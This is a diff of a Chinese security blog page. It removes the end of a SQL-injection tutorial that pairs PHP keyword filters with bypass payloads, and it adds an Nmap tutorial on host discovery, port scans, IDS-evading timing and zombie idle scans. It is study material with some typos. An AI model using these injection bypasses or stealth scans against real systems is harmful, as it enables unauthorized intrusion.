-</code></pre>
-<p>会过滤的攻击代码</p>
-<pre><code class="sql">1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1 &amp;&amp; lpad(user,7,1)
-</code></pre>
-<h3 id="10-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr-空格"><a href="#10-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr-空格" class="headerlink" title="10. 过滤关键字:  and or union where limit group by select ‘ hex substr 空格"></a>10. 过滤关键字:  and or union where limit group by select ‘ hex substr 空格</h3><p>php代码</p>
-<pre><code class="php">preg_match(&#39;/(and|or|union|where|limit|group by|select|\&#39;|hex|substr|\s)/i&#39;, $id)
-</code></pre>
-<p>会过滤的攻击代码</p>
-<pre><code class="sql">1 &amp;&amp; lpad(user,7,1)
-</code></pre>
-<p>绕过方式</p>
-<pre><code class="sql">1%0b||%0blpad(user,7,1)
-</code></pre>
+        <h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><hr>
+<h2 id="Nmap介绍"><a href="#Nmap介绍" class="headerlink" title="Nmap介绍"></a>Nmap介绍</h2><p>Nmap，中文名”网络映射器”。一款开放源代码的网络探测和安全审核的工具。它能扫描大型网络和单个主机。</p>
+<p>Nmap可以使用原始IP报文来发现网络上有哪些主机，这些主机提供什么服务，服务运行在什么操作系统，使用什么类型的报文过滤器或防火墙等等功能。</p>
+<h2 id="Nmap基本用法"><a href="#Nmap基本用法" class="headerlink" title="Nmap基本用法"></a>Nmap基本用法</h2><h3 id="简单的扫描"><a href="#简单的扫描" class="headerlink" title="简单的扫描"></a>简单的扫描</h3><p><strong>namp 192.168.126.131</strong></p>
+<p>该扫描方式可以针对IP或域名进行扫描，可以方便的发现目标端口的开放情况及主机在线情况。</p>
+<p>扫描的结果可以很轻易的发现open端口，也可以发现相关的服务名称</p>
+<h3 id="Ping扫描-sP"><a href="#Ping扫描-sP" class="headerlink" title="Ping扫描(-sP)"></a>Ping扫描(-sP)</h3><p><strong>nmap -sP 192.168.126.131/24</strong></p>
+<p>Ping扫描只进行Ping,显示在线的主机。该选项可以很轻易的获取目标信息而不会被轻易发现</p>
+<h3 id="无Ping扫描-P0"><a href="#无Ping扫描-P0" class="headerlink" title="无Ping扫描(-P0)"></a>无Ping扫描(-P0)</h3><p><strong>nmap -P0 192.168.126.131</strong></p>
+<p>无Ping扫描通常用于防火墙禁止Ping的情况下。可以穿透防火墙，避免被防火墙发现。</p>
+<h3 id="TCP-STN-Ping扫描-PS"><a href="#TCP-STN-Ping扫描-PS" class="headerlink" title="TCP STN Ping扫描(-PS)"></a>TCP STN Ping扫描(-PS)</h3><p><strong>nmap -PS -v 192.168.121.1</strong></p>
+<p>-PS选项发送一个设置了SYN标志位的空TCP报文，默认端口80，可以指定一个以逗号分割的端口列表(-PS22,23,25)</p>
+<p>默认的Ping扫描使用TCP ACK和ICMP Echo请求对目标进行是否存活的响应。当目标主机防火墙组织这些请求时，可以使用TCP SYN Ping扫描进行对目标主机存活的判断</p>
+<p>我们也可以whiffing一个端口或范围来避免扫描结果的不准确</p>
+<p><strong>nmap -PS80,100-200 -v 192.168.121.1</strong></p>
+<h3 id="TCP-ACK-Ping扫描-PA"><a href="#TCP-ACK-Ping扫描-PA" class="headerlink" title="TCP ACK Ping扫描(-PA)"></a>TCP ACK Ping扫描(-PA)</h3><p><strong>nmap -PA -v 192.168.121.1</strong></p>
+<p>与TCP SYN Ping扫描的区别就是设置TCP的标识为是ACK而不是SYN，这种方式可以探测阻止SYN包或ICMP Echo请求的主机</p>
+<h3 id="UDP-Ping扫描-PU"><a href="#UDP-Ping扫描-PU" class="headerlink" title="UDP Ping扫描(-PU)"></a>UDP Ping扫描(-PU)</h3><p><strong>nmap -PU -v 192.168.121.1</strong></p>
+<p>-PU发送一个空的UDP报文到指定端口，不指定则默认端口40125。</p>
+<p>使用UDP Ping扫描时候Nmap会发送一个空的UDP包到目标主机，如果目标主机响应会返回一个ICMP端口不可达错误，如果目标主机不是存活状态则会返回各种ICMP错误信息</p>
+<h3 id="ICMP-Ping-Types扫描-PE-PP-PM"><a href="#ICMP-Ping-Types扫描-PE-PP-PM" class="headerlink" title="ICMP Ping Types扫描(-PE;-PP;-PM)"></a>ICMP Ping Types扫描(-PE;-PP;-PM)</h3><p>ICMP(Internet控制报文协议)，是TCP／IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息(指网络通不通、主机是否可达、路由是否可用等网络本身的消息)。</p>
+<h4 id="PE"><a href="#PE" class="headerlink" title="-PE"></a>-PE</h4><p><strong>nmap -PE -v 192.168.121.1</strong></p>
+<p>-PE是通过向目标发送ICMP Echo数据包来探测目标主机是否在线，因为许多防火墙会禁止这些报文，所以仅仅ICMP扫描对于互联网上的目标通常是不够的</p>
+<h4 id="PP"><a href="#PP" class="headerlink" title="-PP"></a>-PP</h4><p><strong>nmap -pp -v 163.com</strong></p>
+<p>-PP选项是ICMP时间戳Ping扫描，虽然大多数的防火墙配置不允许ICMP Echo请求，但配置不当可能恢复ICMP时间戳请求，所以可以使用ICMP时间戳来确定目标主机是否存活。</p>
+<h4 id="PM"><a href="#PM" class="headerlink" title="-PM"></a>-PM</h4><p><strong>nmap -PM -v 192.168.121.1</strong></p>
+<p>-PM选项可以进行ICMP地址掩码Ping扫描。这种扫描会试图用备选的ICMP等级Ping制定主机，通常有不错的穿透防火墙的效果</p>
+<h3 id="ARP-Ping扫描-PR"><a href="#ARP-Ping扫描-PR" class="headerlink" title="ARP Ping扫描(-PR)"></a>ARP Ping扫描(-PR)</h3><p><strong>nmap -PR 192.168.126.131</strong></p>
+<p>-PR选项通常在扫描局域网时使用。ARP Ping扫描是Nmap对目标进行一个ARP Ping的过程。在本地局域网中防火墙不会禁止ARP请求，这就使得其他Ping扫描都更加高效，在内网中使用ARP Ping是非常有效的。</p>
+<h3 id="扫描列表-sL"><a href="#扫描列表-sL" class="headerlink" title="扫描列表(-sL)"></a>扫描列表(-sL)</h3><p><strong>nmap -sL 192.168.121.131/24</strong></p>
+<p>列表扫描是主机发现的退化形式，它仅仅列出指定网络上的每台主机，不发送任何报文到目标主机</p>
+<h3 id="禁止反向域名解析-n"><a href="#禁止反向域名解析-n" class="headerlink" title="禁止反向域名解析(-n)"></a>禁止反向域名解析(-n)</h3><p><strong>nmap -n -sL 124.172.156.75/24</strong></p>
+<p>-n意为禁止解析域名，使用该选项的时候Nmap永远不对目标IP地址做反响域名解析</p>
+<h3 id="反向域名解析-R"><a href="#反向域名解析-R" class="headerlink" title="反向域名解析(-R)"></a>反向域名解析(-R)</h3><p><strong>nmap -R -sL /*.172.156.75/24</strong></p>
+<h3 id="使用系统域名解析器-–system-dns"><a href="#使用系统域名解析器-–system-dns" class="headerlink" title="使用系统域名解析器(–system-dns)"></a>使用系统域名解析器(–system-dns)</h3><p><strong>nmap –system-dns 192.168.126.2 192.168.126.131</strong></p>
+<h3 id="扫描一个IPV6地址-6"><a href="#扫描一个IPV6地址-6" class="headerlink" title="扫描一个IPV6地址(-6)"></a>扫描一个IPV6地址(-6)</h3><p><strong>nmap -6 fe80::20c:29ff:fee0:2e76</strong></p>
+<h3 id="路由跟踪-–traceroute"><a href="#路由跟踪-–traceroute" class="headerlink" title="路由跟踪(–traceroute)"></a>路由跟踪(–traceroute)</h3><p><strong>nmap –traceroute -v <a href="http://www.163.com" target="_blank" rel="noopener">www.163.com</a></strong></p>
+<p>使用路由跟踪功能可以帮助用户了解网络的同行情况，通过此选项可以轻松查出从本地计算机到目标之间所经过的网络节点，并看到通过各个节点的时间</p>
+<h3 id="SCTP-INIT-Ping扫描"><a href="#SCTP-INIT-Ping扫描" class="headerlink" title="SCTP INIT Ping扫描"></a>SCTP INIT Ping扫描</h3><p>SCTP(流控制传输协议)是IETF在2000年定义的一个传输层协议。SCTP可以看作是TCP协议的改进。</p>
+<p><strong>nmap -PY -v 198.168.121.1</strong></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="时序选择-T"><a href="#时序选择-T" class="headerlink" title="时序选择(-T)"></a>时序选择(-T)</h3><p>Nmap使用-T(0-5)启用时序选择</p>
+<ol>
+<li>-T0：非常慢的扫描，用于IDS逃避</li>
+<li>-T1：缓慢的扫描，用于IDS逃避</li>
+<li>-T2：降低速度以降低对带宽的消耗，一般不常用</li>
+<li>-T3：默认，根据目标的反应自动调整时间</li>
+<li>-T4：快速扫描，常用扫描方式，需要在很好的网络环境下进行扫描</li>
+<li>-T5：极速扫描，牺牲准确度来提升速度</li>
+</ol>
+<p><strong>nmap -T0 192.168.126.131</strong></p>
+<h3 id="常用扫描方式-p-F"><a href="#常用扫描方式-p-F" class="headerlink" title="常用扫描方式(-p|-F)"></a>常用扫描方式(-p|-F)</h3><h4 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h4><p>该选项指定一个你想要扫描的端口号，可以指定一个也可以指定一个范围</p>
+<p><strong>nmap -p 445 192.168.126.131</strong></p>
+<h4 id="F"><a href="#F" class="headerlink" title="-F"></a>-F</h4><p>该选项可以快速的扫描端口，只会扫描有限的端口</p>
+<p><strong>nmap -F 192.168.126.131</strong></p>
+<h4 id="r"><a href="#r" class="headerlink" title="-r"></a>-r</h4><p>默认情况Nmap是进行随机顺序扫描的，使用该选项可以进行排序</p>
+<h4 id="–top-ports"><a href="#–top-ports" class="headerlink" title="–top-ports"></a>–top-ports</h4><p><strong>nmap –top-ports 100 192.168.126.131</strong></p>
+<p>上述结果为扫描一百个开放率最高的端口</p>
+<h4 id="–port-ratio"><a href="#–port-ratio" class="headerlink" title="–port-ratio"></a>–port-ratio</h4><p>使用该选项会扫描指定一定概率以上的端口，这里的参数作为频率使用</p>
+<h3 id="TCP-SYN扫描-sS"><a href="#TCP-SYN扫描-sS" class="headerlink" title="TCP SYN扫描(-sS)"></a>TCP SYN扫描(-sS)</h3><p>SYN扫描方式是相对比较隐蔽的扫描方式，很难被防火墙或管理员发现，因为它不会进行TCP的链接。这是一种高效有用的方式</p>
+<p>它常常被称为半开放扫描。</p>
+<p><strong>nmap -sS 192.168.126.131</strong></p>
+<h3 id="TCP连接扫描-sT"><a href="#TCP连接扫描-sT" class="headerlink" title="TCP连接扫描(-sT)"></a>TCP连接扫描(-sT)</h3><p>它用于SYN扫描不能使用的时候，Nmap会在每个端口完成三次握手，所以TCP连接扫描是端口中最基础、最稳定的扫描方式</p>
+<p><strong>nmap -sT 192.168.126.131</strong></p>
+<h3 id="UDP扫描-sU"><a href="#UDP扫描-sU" class="headerlink" title="UDP扫描(-sU)"></a>UDP扫描(-sU)</h3><p>UDP扫描是十分慢的，很多管理员会忽略这些端口，使用UDP扫描或许可以发现更多的被黑客利用的端口。</p>
+<p>UDP扫描发送空的UDP报文到目标端口，如果返回ICMP端口不可到达错误就可以认定端口是关闭的，其他的就可以认定是被过滤的，如果被响应了则判断目标端口是开放状态</p>
+<p><strong>nmap -sU -p 80-500 192.168.126.131</strong></p>
+<p>由于UDP扫描是相当慢的，所以使用-p选项指定需要扫描的端口</p>
+<h3 id="隐蔽扫描-sN-sF-sX"><a href="#隐蔽扫描-sN-sF-sX" class="headerlink" title="隐蔽扫描(-sN;-sF;-sX)"></a>隐蔽扫描(-sN;-sF;-sX)</h3><h4 id="sN"><a href="#sN" class="headerlink" title="-sN"></a>-sN</h4><p>Null扫描，通过发送非常规的TCP通信数据包对计算机进行探测，很多情况Null扫描与Xmas恰好相反，因为Null不会标记任何数据包。若目标主机的相应端口是关闭的，会响应一个RST数据包，若目标端口开放则不会响应任何信息</p>
+<h4 id="sF"><a href="#sF" class="headerlink" title="-sF"></a>-sF</h4><p>FIN扫描，当我们使用TCP SYN扫描可能会被目标主机的防火墙发现，会阻止SYN数据包，当使用TCP FIN就有很好的穿透效果。</p>
+<h4 id="sX"><a href="#sX" class="headerlink" title="-sX"></a>-sX</h4><p>Xmas扫描。</p>
+<p>这些扫描方式会躲过一些无状态防火墙的过滤。比SYN扫描，UDP扫描会有更好的效果，因为这种方式比SYN扫描还要隐蔽。如果扫描不出结果或被过滤的情况下，可以使用该扫描方式。</p>
+<p><strong>nmap -sN 192.128.126.131</strong></p>
+<h3 id="TCP-ACK扫描-sA"><a href="#TCP-ACK扫描-sA" class="headerlink" title="TCP ACK扫描(-sA)"></a>TCP ACK扫描(-sA)</h3><p>它有一个非常致命的缺点，它不能确定端口是否开放的还是关闭的</p>
+<p><strong>nmap -sA -v 192.168.121.1</strong></p>
+<h3 id="TCP窗口扫描-sW"><a href="#TCP窗口扫描-sW" class="headerlink" title="TCP窗口扫描(-sW)"></a>TCP窗口扫描(-sW)</h3><p>窗口扫描方式与ACK扫描方式的原理几乎一样</p>
+<p><strong>nmap -sW -v -F 192.168.121.1</strong></p>
+<h3 id="自定义TCP扫描-–scanflags"><a href="#自定义TCP扫描-–scanflags" class="headerlink" title="自定义TCP扫描(–scanflags)"></a>自定义TCP扫描(–scanflags)</h3><p>使用该选项可以启用自定义TCP扫描，属于高级用法</p>
+<p>–scanflags使用字符名，只要是URG;ACK;PSH;RST;SYN;FIN任何组合就可以。标识位的顺序不重要</p>
+<p><strong>nmap -sT –scanflags SYNURG 192.168.126.131</strong></p>
+<h3 id="空闲扫描-sI"><a href="#空闲扫描-sI" class="headerlink" title="空闲扫描(-sI)"></a>空闲扫描(-sI)</h3><p>空闲扫描是Nmap高级用法</p>
+<p>允许进行端口完全欺骗扫描。可以是攻击者能够不使用自己的IP向目标主机发送数据包，可以利用不活跃的僵尸主机反弹给攻击者一个旁通信道，进行端口扫描。</p>
+<p><strong>nmap -sI <a href="http://www.0day.co:80" target="_blank" rel="noopener">www.0day.co:80</a> 192.168.126.131</strong></p>
+<p>这是利用僵尸主机位<a href="http://www.0day.co的主机对102.168.126.131进行空闲扫描" target="_blank" rel="noopener">www.0day.co的主机对102.168.126.131进行空闲扫描</a></p>
+<h3 id="IP协议扫描-sO"><a href="#IP协议扫描-sO" class="headerlink" title="IP协议扫描(-sO)"></a>IP协议扫描(-sO)</h3><p>该选项会确定目标端口的协议类型，IP协议扫描可以帮助用户确定主机支持那些IP协议，例如TCP、ICMP、IGMP。</p>
+<p><strong>nmap -sO -T4 102.168.126.131</strong></p>
 
         
     
@@ -643,21 +600,13 @@ select * from news limit 1 offset 0
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2018/05/24/3/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            Newer
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
     
-        <a href="/2018/05/24/1/" id="post_nav-older" class="next-content">
+        <a href="/2018/05/26/6/" id="post_nav-older" class="next-content">
             Older
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
